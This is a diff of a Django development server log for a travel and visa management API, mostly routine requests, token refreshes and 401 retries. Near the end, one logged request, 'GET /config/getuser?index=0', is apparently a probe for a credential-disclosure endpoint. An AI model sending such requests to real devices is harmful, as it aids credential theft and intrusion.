@@ -1,161 +1,932 @@
-INFO|19/May/2021 16:01:16|basehttp|3768|140541293086464|"GET / HTTP/1.1" 200 9567
-INFO|19/May/2021 16:01:16|basehttp|3768|140541043922688|"GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
-INFO|19/May/2021 16:01:16|basehttp|3768|140541043922688|"GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1735
-INFO|19/May/2021 16:01:16|basehttp|3768|140541060708096|"GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
-INFO|19/May/2021 16:01:16|basehttp|3768|140541293086464|"GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
-INFO|19/May/2021 16:01:16|basehttp|3768|140541273941760|"GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
-INFO|19/May/2021 16:01:16|basehttp|3768|140541052315392|"GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 200 86927
-INFO|19/May/2021 16:01:16|basehttp|3768|140541293086464|"GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
-INFO|19/May/2021 16:01:16|basehttp|3768|140541060708096|"GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268
-INFO|19/May/2021 16:01:16|basehttp|3768|140541043922688|"GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37608
-INFO|19/May/2021 16:01:16|basehttp|3768|140541284693760|"GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457
-INFO|19/May/2021 16:01:16|basehttp|3768|140541284693760|"GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
-WARNING|19/May/2021 16:01:24|log|3768|140541284693760|Not Found: /user
-WARNING|19/May/2021 16:01:24|basehttp|3768|140541284693760|"GET /user HTTP/1.1" 404 56764
-ERROR|19/May/2021 16:01:44|log|3768|140541284693760|Internal Server Error: /users/
+WARNING|19/May/2021 16:52:06|log|837566|139890203944704|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 16:52:06|basehttp|837566|139890203944704|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 16:52:06|log|837566|139890203944704|Unauthorized: /getemployee_org_info/
+WARNING|19/May/2021 16:52:06|basehttp|837566|139890203944704|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|19/May/2021 16:52:06|log|837566|139890203944704|Unauthorized: /post_currency_conversion/
+WARNING|19/May/2021 16:52:06|basehttp|837566|139890203944704|"GET /post_currency_conversion/ HTTP/1.1" 401 183
+WARNING|19/May/2021 16:52:06|log|837566|139890195289856|Unauthorized: /get_add/currency/
+WARNING|19/May/2021 16:52:06|basehttp|837566|139890195289856|"GET /get_add/currency/ HTTP/1.1" 401 183
+INFO|19/May/2021 16:52:07|basehttp|837566|139890195289856|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 16:52:07|log|837566|139890195289856|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 16:52:07|basehttp|837566|139890195289856|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 16:52:07|log|837566|139890203944704|Unauthorized: /getemployee_org_info/
+WARNING|19/May/2021 16:52:07|basehttp|837566|139890203944704|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 183
+INFO|19/May/2021 16:52:07|basehttp|837566|139890195289856|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:52:07|basehttp|837566|139890203944704|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 16:52:07|log|837566|139890203944704|Unauthorized: /post_currency_conversion/
+WARNING|19/May/2021 16:52:07|basehttp|837566|139890203944704|"GET /post_currency_conversion/ HTTP/1.1" 401 183
+INFO|19/May/2021 16:52:07|basehttp|837566|139890203944704|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 16:52:07|log|837566|139890203944704|Unauthorized: /get_add/currency/
+WARNING|19/May/2021 16:52:07|basehttp|837566|139890203944704|"GET /get_add/currency/ HTTP/1.1" 401 183
+INFO|19/May/2021 16:52:07|basehttp|837566|139890203944704|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:52:07|basehttp|837566|139890195289856|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:52:07|basehttp|837566|139890203944704|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 16:52:07|basehttp|837566|139890203944704|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:52:07|basehttp|837566|139890203944704|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 16:52:07|basehttp|837566|139890195289856|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:52:09|basehttp|837566|139890195289856|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|19/May/2021 16:52:09|basehttp|837566|139890186897152|"GET /post_currency_conversion/ HTTP/1.1" 200 631848
+INFO|19/May/2021 16:52:29|basehttp|837566|139890186897152|"POST /post_currency_conversion/ HTTP/1.1" 200 81
+INFO|19/May/2021 16:52:41|basehttp|837566|139890186897152|"GET /post_currency_conversion/ HTTP/1.1" 200 631848
+INFO|19/May/2021 16:52:49|basehttp|837566|139890195289856|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 16:52:49|basehttp|837566|139890186897152|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 16:52:58|basehttp|837566|139890203944704|"OPTIONS /get_country_master/?country= HTTP/1.1" 200 0
+INFO|19/May/2021 16:52:58|basehttp|837566|139890195289856|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33815
+INFO|19/May/2021 16:52:58|basehttp|837566|139890186897152|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|19/May/2021 16:52:58|basehttp|837566|139890195289856|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 16:53:01|basehttp|837566|139890195289856|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 16:53:01|basehttp|837566|139890195289856|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 16:53:03|basehttp|837566|139890186897152|"OPTIONS /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 16:53:03|basehttp|837566|139890195289856|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 16:53:03|basehttp|837566|139890186897152|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80058
+INFO|19/May/2021 16:53:20|basehttp|837566|139890186897152|"OPTIONS /update_purpose_of_travel/3/ HTTP/1.1" 200 0
+INFO|19/May/2021 16:53:20|basehttp|837566|139890186897152|"PATCH /update_purpose_of_travel/3/ HTTP/1.1" 200 517
+INFO|19/May/2021 16:53:22|basehttp|837566|139890186897152|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80057
+INFO|19/May/2021 16:53:42|basehttp|837566|139890186897152|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 16:53:42|basehttp|837566|139890186897152|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 16:53:42|basehttp|837566|139890186897152|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 16:53:43|basehttp|837566|139890195289856|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80057
+WARNING|19/May/2021 16:57:10|log|838114|140666632169216|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 16:57:10|basehttp|838114|140666632169216|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 16:57:10|log|838114|140666632169216|Unauthorized: /getemployee_org_info/
+WARNING|19/May/2021 16:57:10|basehttp|838114|140666632169216|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|19/May/2021 16:57:10|log|838114|140666632169216|Unauthorized: /get_country_master/
+WARNING|19/May/2021 16:57:10|basehttp|838114|140666632169216|"GET /get_country_master/?country= HTTP/1.1" 401 183
+WARNING|19/May/2021 16:57:11|log|838114|140666632169216|Unauthorized: /get_add/visa_purpose_list/
+WARNING|19/May/2021 16:57:11|basehttp|838114|140666632169216|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 401 183
+INFO|19/May/2021 16:57:11|basehttp|838114|140666632169216|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 16:57:11|log|838114|140666632169216|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 16:57:11|basehttp|838114|140666632169216|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 16:57:11|log|838114|140666554283776|Unauthorized: /getemployee_org_info/
+WARNING|19/May/2021 16:57:11|basehttp|838114|140666554283776|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 183
+INFO|19/May/2021 16:57:11|basehttp|838114|140666632169216|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:57:11|basehttp|838114|140666632169216|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 16:57:11|log|838114|140666554283776|Unauthorized: /get_country_master/
+WARNING|19/May/2021 16:57:11|basehttp|838114|140666554283776|"GET /get_country_master/?country= HTTP/1.1" 401 183
+INFO|19/May/2021 16:57:11|basehttp|838114|140666545891072|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 16:57:11|log|838114|140666545891072|Unauthorized: /get_add/visa_purpose_list/
+WARNING|19/May/2021 16:57:11|basehttp|838114|140666545891072|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 401 183
+INFO|19/May/2021 16:57:11|basehttp|838114|140666545891072|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:57:11|basehttp|838114|140666632169216|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:57:11|basehttp|838114|140666537498368|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 16:57:11|basehttp|838114|140666554283776|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 16:57:11|basehttp|838114|140666554283776|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:57:11|basehttp|838114|140666554283776|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 16:57:12|basehttp|838114|140666554283776|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 16:57:12|basehttp|838114|140666537498368|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80057
+INFO|19/May/2021 16:59:17|basehttp|838343|140487470384896|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 16:59:17|basehttp|838343|140487470384896|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 16:59:17|basehttp|838343|140487470384896|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 16:59:17|basehttp|838343|140487460943616|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80057
+INFO|19/May/2021 17:00:14|basehttp|838343|140487460943616|"OPTIONS /update_purpose_of_travel/1/ HTTP/1.1" 200 0
+INFO|19/May/2021 17:00:15|basehttp|838343|140487460943616|"PATCH /update_purpose_of_travel/1/ HTTP/1.1" 200 534
+INFO|19/May/2021 17:00:16|basehttp|838343|140487460943616|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80058
+INFO|19/May/2021 17:01:39|basehttp|838343|140487460943616|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:01:39|basehttp|838343|140487470384896|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:01:56|basehttp|838343|140487470384896|"OPTIONS /get_post_location/?organization=ORG150866&country=United%20States HTTP/1.1" 200 0
+INFO|19/May/2021 17:01:56|basehttp|838343|140487470384896|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:01:57|basehttp|838343|140487460943616|"GET /get_post_location/?organization=ORG150866&country=United%20States HTTP/1.1" 200 839
+INFO|19/May/2021 17:02:25|basehttp|838343|140487470384896|"OPTIONS /get_state_master/?country_id=101 HTTP/1.1" 200 0
+WARNING|19/May/2021 17:02:25|log|838343|140487470384896|Unauthorized: /get_state_master/
+WARNING|19/May/2021 17:02:25|basehttp|838343|140487470384896|"GET /get_state_master/?country_id=101 HTTP/1.1" 401 183
+INFO|19/May/2021 17:02:26|basehttp|838343|140487470384896|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:03:23|basehttp|838343|140487449929472|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:03:23|basehttp|838343|140487470384896|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:03:23|basehttp|838343|140487470384896|"GET /get_post_location/?organization=ORG150866&country=United%20States HTTP/1.1" 200 839
+INFO|19/May/2021 17:03:23|basehttp|838343|140487460943616|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:04:43|basehttp|838343|140487460943616|"GET /get_state_master/?country_id=101 HTTP/1.1" 200 8604
+INFO|19/May/2021 17:05:04|basehttp|838343|140487460943616|"OPTIONS /get_post_location/ HTTP/1.1" 200 0
+WARNING|19/May/2021 17:05:04|log|838343|140487460943616|Bad Request: /get_post_location/
+WARNING|19/May/2021 17:05:04|basehttp|838343|140487460943616|"POST /get_post_location/ HTTP/1.1" 400 90
+WARNING|19/May/2021 17:21:01|log|840451|140116677125888|Unauthorized: /get_post_location/
+WARNING|19/May/2021 17:21:01|basehttp|840451|140116677125888|"POST /get_post_location/ HTTP/1.1" 401 183
+WARNING|19/May/2021 17:21:01|log|840451|140116597143296|Unauthorized: /get_post_location/
+WARNING|19/May/2021 17:21:01|basehttp|840451|140116597143296|"POST /get_post_location/ HTTP/1.1" 401 183
+INFO|19/May/2021 17:21:01|basehttp|840451|140116677125888|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:21:02|log|840451|140116597143296|Unauthorized: /get_post_location/
+WARNING|19/May/2021 17:21:02|basehttp|840451|140116597143296|"POST /get_post_location/ HTTP/1.1" 401 183
+INFO|19/May/2021 17:21:02|basehttp|840451|140116677125888|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:21:02|basehttp|840451|140116677125888|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:21:02|basehttp|840451|140116597143296|"POST /get_post_location/ HTTP/1.1" 200 759
+INFO|19/May/2021 17:21:10|basehttp|840451|140116597143296|"GET /get_post_location/?organization=ORG150866&country=United%20States HTTP/1.1" 200 839
+INFO|19/May/2021 17:21:16|basehttp|840451|140116597143296|"OPTIONS /get_post_location/?organization=ORG150866&country=India HTTP/1.1" 200 0
+INFO|19/May/2021 17:21:16|basehttp|840451|140116597143296|"GET /get_post_location/?organization=ORG150866&country=India HTTP/1.1" 200 2260
+INFO|19/May/2021 17:22:30|basehttp|840451|140116597143296|"OPTIONS /update_master_location/21/ HTTP/1.1" 200 0
+INFO|19/May/2021 17:22:30|basehttp|840451|140116597143296|"PATCH /update_master_location/21/ HTTP/1.1" 200 747
+INFO|19/May/2021 17:22:31|basehttp|840451|140116597143296|"GET /get_post_location/?organization=ORG150866&country=India HTTP/1.1" 200 2263
+INFO|19/May/2021 17:23:10|basehttp|840451|140116677125888|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:23:10|basehttp|840451|140116597143296|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:23:12|basehttp|840451|140116588750592|"OPTIONS /post_country_policy/?organization_id=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 17:23:12|basehttp|840451|140116597143296|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:23:12|basehttp|840451|140116588750592|"GET /post_country_policy/?organization_id=ORG150866 HTTP/1.1" 200 33688
+INFO|19/May/2021 17:23:12|basehttp|840451|140116677125888|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|19/May/2021 17:23:52|basehttp|840451|140116677125888|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:23:52|basehttp|840451|140116588750592|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:23:58|basehttp|840451|140116677125888|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:23:58|basehttp|840451|140116588750592|"GET /get_add/visa_purpose_list/?organization=ORG150866 HTTP/1.1" 200 80058
+WARNING|19/May/2021 17:29:58|log|840451|140116588750592|Unauthorized: /get_org_count_visa_requests/
+WARNING|19/May/2021 17:29:58|basehttp|840451|140116588750592|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 17:29:58|log|840451|140116588750592|Unauthorized: /get_org_count_travel_requests/
+WARNING|19/May/2021 17:29:58|basehttp|840451|140116588750592|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 401 183
+INFO|19/May/2021 17:29:58|basehttp|840451|140116588750592|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:29:58|basehttp|840451|140116597143296|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:29:58|log|840451|140116677125888|Unauthorized: /get_org_count_visa_requests/
+WARNING|19/May/2021 17:29:58|basehttp|840451|140116677125888|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 17:29:58|log|840451|140116588750592|Unauthorized: /get_org_count_travel_requests/
+WARNING|19/May/2021 17:29:58|basehttp|840451|140116588750592|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 401 183
+INFO|19/May/2021 17:29:58|basehttp|840451|140116677125888|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:29:58|basehttp|840451|140116597143296|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:29:58|basehttp|840451|140116588750592|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:29:58|basehttp|840451|140116677125888|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:30:06|basehttp|840451|140116588750592|"OPTIONS /get_post_salutation/ HTTP/1.1" 200 0
+INFO|19/May/2021 17:30:06|basehttp|840451|140116677125888|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:30:06|basehttp|840451|140116588750592|"GET /get_post_salutation/ HTTP/1.1" 200 2888
+INFO|19/May/2021 17:30:33|basehttp|840451|140116677125888|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:30:33|basehttp|840451|140116588750592|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:30:45|basehttp|840451|140116588750592|"OPTIONS /get_post_suffix/ HTTP/1.1" 200 0
+INFO|19/May/2021 17:30:45|basehttp|840451|140116588750592|"GET /get_post_suffix/ HTTP/1.1" 200 3269
+INFO|19/May/2021 17:30:45|basehttp|840451|140116677125888|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:31:27|basehttp|841446|140182565156608|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:31:27|basehttp|841446|140182649276160|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:31:28|basehttp|841446|140182565156608|"GET /get_post_salutation/ HTTP/1.1" 200 2888
+INFO|19/May/2021 17:31:28|basehttp|841446|140182649276160|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:31:36|basehttp|841446|140182649276160|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:31:36|basehttp|841446|140182565156608|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:32:29|basehttp|841537|140224110552832|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:32:29|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:32:29|basehttp|841537|140224110552832|"GET /get_post_salutation/ HTTP/1.1" 200 2888
+INFO|19/May/2021 17:32:29|basehttp|841537|140224101897984|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:32:34|basehttp|841537|140224101897984|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|19/May/2021 17:32:34|basehttp|841537|140224110552832|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|19/May/2021 17:32:35|basehttp|841537|140224110552832|"GET /get_post_suffix/ HTTP/1.1" 200 3269
+INFO|19/May/2021 17:32:36|basehttp|841537|140224101897984|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+WARNING|19/May/2021 17:37:30|log|841537|140224101897984|Unauthorized: /get_post_suffix/
+WARNING|19/May/2021 17:37:30|basehttp|841537|140224101897984|"POST /get_post_suffix/ HTTP/1.1" 401 183
+INFO|19/May/2021 17:37:30|basehttp|841537|140224101897984|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:37:30|log|841537|140224110552832|Unauthorized: /get_post_suffix/
+WARNING|19/May/2021 17:37:30|basehttp|841537|140224110552832|"POST /get_post_suffix/ HTTP/1.1" 401 183
+INFO|19/May/2021 17:37:30|basehttp|841537|140224101897984|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:37:30|basehttp|841537|140224110552832|"POST /get_post_suffix/ HTTP/1.1" 200 467
+INFO|19/May/2021 17:37:32|basehttp|841537|140224110552832|"GET /get_post_suffix/ HTTP/1.1" 200 3680
+INFO|19/May/2021 17:40:20|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:40:20|basehttp|841537|140224110552832|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:40:21|basehttp|841537|140224090621696|"GET /get_post_suffix/ HTTP/1.1" 200 3680
+INFO|19/May/2021 17:40:21|basehttp|841537|140224101897984|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:41:18|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:41:18|basehttp|841537|140224110552832|"GET /get_post_suffix/ HTTP/1.1" 200 3680
+INFO|19/May/2021 17:41:18|basehttp|841537|140224101897984|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:41:18|basehttp|841537|140224090621696|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:42:25|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:42:25|basehttp|841537|140224090621696|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:42:25|basehttp|841537|140224090621696|"GET /get_post_suffix/ HTTP/1.1" 200 3680
+INFO|19/May/2021 17:42:25|basehttp|841537|140224101897984|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+WARNING|19/May/2021 17:42:58|log|841537|140224101897984|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 17:42:58|basehttp|841537|140224101897984|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|19/May/2021 17:42:58|log|841537|140224101897984|Unauthorized: /getemployee_org_info/
+WARNING|19/May/2021 17:42:58|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|19/May/2021 17:42:58|log|841537|140224090621696|Unauthorized: /get_post_suffix/
+WARNING|19/May/2021 17:42:58|basehttp|841537|140224090621696|"GET /get_post_suffix/ HTTP/1.1" 401 183
+WARNING|19/May/2021 17:42:58|log|841537|140224101897984|Unauthorized: /get_country_master/
+WARNING|19/May/2021 17:42:58|basehttp|841537|140224101897984|"GET /get_country_master/?country= HTTP/1.1" 401 183
+WARNING|19/May/2021 17:42:59|log|841537|140224101897984|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 17:42:59|basehttp|841537|140224101897984|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+INFO|19/May/2021 17:42:59|basehttp|841537|140224090621696|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:42:59|basehttp|841537|140224082228992|"OPTIONS /get_post_marital_status/ HTTP/1.1" 200 0
+INFO|19/May/2021 17:42:59|basehttp|841537|140224090621696|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:42:59|log|841537|140224110552832|Unauthorized: /get_country_master/
+WARNING|19/May/2021 17:42:59|basehttp|841537|140224110552832|"GET /get_country_master/?country= HTTP/1.1" 401 183
+INFO|19/May/2021 17:42:59|basehttp|841537|140224101897984|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:42:59|log|841537|140224101897984|Unauthorized: /getemployee_org_info/
+WARNING|19/May/2021 17:42:59|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 183
+INFO|19/May/2021 17:42:59|basehttp|841537|140224110552832|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:42:59|log|841537|140224090621696|Unauthorized: /get_post_notification/
+WARNING|19/May/2021 17:42:59|basehttp|841537|140224090621696|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+INFO|19/May/2021 17:42:59|basehttp|841537|140224110552832|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|19/May/2021 17:42:59|log|841537|140224101897984|Unauthorized: /get_post_marital_status/
+WARNING|19/May/2021 17:42:59|basehttp|841537|140224101897984|"GET /get_post_marital_status/ HTTP/1.1" 401 183
+INFO|19/May/2021 17:42:59|basehttp|841537|140224101897984|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:42:59|basehttp|841537|140224101897984|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:42:59|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:42:59|basehttp|841537|140224101897984|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:42:59|basehttp|841537|140224090621696|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|19/May/2021 17:42:59|basehttp|841537|140224082228992|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:42:59|basehttp|841537|140224082228992|"GET /get_post_marital_status/ HTTP/1.1" 200 6269
+INFO|19/May/2021 17:42:59|basehttp|841537|140224110552832|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:45:31|basehttp|841537|140224110552832|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:45:31|basehttp|841537|140224082228992|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:45:31|basehttp|841537|140224110552832|"GET /get_post_suffix/ HTTP/1.1" 200 3680
+INFO|19/May/2021 17:45:31|basehttp|841537|140224082228992|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+WARNING|19/May/2021 17:45:59|log|841537|140224082228992|Not Found: /config/getuser
+WARNING|19/May/2021 17:46:00|basehttp|841537|140224082228992|"GET /config/getuser?index=0 HTTP/1.1" 404 56810
+ERROR|19/May/2021 17:46:00|basehttp|841537|140224082228992|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+INFO|19/May/2021 17:46:05|basehttp|841537|140224110552832|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|19/May/2021 17:46:05|basehttp|841537|140224082228992|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 17:46:05|basehttp|841537|140224082228992|"GET /get_post_suffix/ HTTP/1.1" 200 3680
+INFO|19/May/2021 17:46:05|basehttp|841537|140224110552832|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|19/May/2021 17:46:23|basehttp|841537|140224110552832|"OPTIONS /update_master_suffix/9/ HTTP/1.1" 200 0
